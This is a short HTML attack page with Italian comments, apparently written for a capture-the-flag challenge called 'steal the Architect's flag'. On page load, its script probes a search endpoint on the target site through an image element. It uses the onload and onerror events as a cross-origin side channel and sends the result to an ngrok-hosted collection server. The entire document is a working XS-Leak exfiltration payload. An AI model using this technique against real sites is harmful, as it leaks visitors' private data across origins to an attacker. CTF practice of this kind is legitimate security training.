<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rubare Flag</title>
</head>
<body>
    <h1>Rubare la Flag dell'Architetto</h1>

    <script>
        const stealFlag = () => {
            // Prova con un'immagine, che non segue SOP
            const img = document.createElement('img');
            img.src = 'https://matrix.capturetheflags.site/search?s=flag'; // Endpoint target

            // onload e onerror vengono usati come canale side-channel
            img.onload = () => {
                console.log("Richiesta riuscita: flag accessibile!");

                // Segnala che la flag è accessibile
                const imgSuccess = new Image();
                imgSuccess.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?result=accessibile';
            };

            img.onerror = () => {
                console.log("Errore: flag non accessibile.");

                // Segnala che la flag non è accessibile
                const imgError = new Image();
                imgError.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?result=non_accessibile';
            };

            document.body.appendChild(img);
        };

        // Eseguire automaticamente la funzione al caricamento della pagina
        window.onload = stealFlag;
    </script>
</body>
</html>
